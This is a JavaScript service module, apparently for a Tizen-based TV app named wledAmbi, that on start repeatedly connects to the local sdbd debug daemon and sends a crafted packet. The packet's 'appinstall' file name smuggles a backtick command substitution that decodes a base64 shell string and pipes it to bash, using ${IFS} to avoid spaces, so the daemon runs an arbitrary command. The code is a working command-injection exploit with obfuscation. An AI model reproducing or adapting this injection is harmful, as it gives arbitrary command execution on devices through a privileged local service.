// wledAmbi service - fires the sdbd loopback injection that starts the daemon.
var LOG='/home/owner/share/wledsvc.log';
function lg(s){ try{ require('fs').appendFileSync(LOG, s+'\n'); }catch(e){} }
module.exports.onStart = function(){
  lg('onStart');
  var net, B;
  try{ net=require('net'); lg('net ok'); }catch(e){ lg('no net '+e.message); return true; }
  try{ B=Buffer; lg('Buffer ok'); }catch(e){ lg('no Buffer '+e.message); return true; }
  function u(v){ var b=B.alloc(4); b.writeUInt32LE(v>>>0); return b; }
  function pkt(c,a0,a1,d){ var q=B.from(c,'ascii').readUInt32LE(0),s=0; for(var i=0;i<d.length;i++) s+=d[i]; return B.concat([u(q),u(a0),u(a1),u(d.length),u(s),u((q^0xFFFFFFFF)>>>0),d]); }
  function injCmd(cmd){
    var g=Math.random().toString(16).slice(2,10);
    var sh='/bin/mkdir -p /tmp/s-'+g+' 2>/dev/null&&{ '+cmd+';}';
    return 'shell:0 appinstall tpk new2.tpk'+String.fromCharCode(96)+'printf'+String.fromCharCode(36)+'{IFS}%s'+String.fromCharCode(36)+'{IFS}'+B.from(sh).toString('base64')+'|base64'+String.fromCharCode(36)+'{IFS}-d|bash'+String.fromCharCode(96)+'.tpk';
  }
  var CMD='setsid /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 >/home/owner/share/tmp/sdk_tools/ppi_auto.log 2>&1';
  var tries=0;
  function fire(){
    var s=net.createConnection(26101,'127.0.0.1'); var op=false,bf=B.alloc(0);
    s.on('connect',function(){ s.write(pkt('CNXN',0x01000000,4096,B.from('host::\0','ascii'))); });
    s.on('data',function(d){ bf=B.concat([bf,d]);
      while(bf.length>=24){ var dl=bf.readUInt32LE(12); if(bf.length<24+dl) break;
        var n=bf.slice(0,4).toString('ascii'); bf=bf.slice(24+dl);
        if(n==='CNXN'&&!op){ op=true; s.write(pkt('OPEN',1,0,B.from(injCmd(CMD)+'\0','ascii'))); lg('inj sent'); }
        if(n==='CLSE'&&op){ lg('done'); s.end(); }
      }});
    s.on('error',function(e){ lg('err '+e.message); });
  }
  var t=setInterval(function(){ tries++; if(tries>10){clearInterval(t);return;} fire(); },5000);
  return true;
};
module.exports.onRequest=function(){ return true; };
module.exports.onExit=function(){};
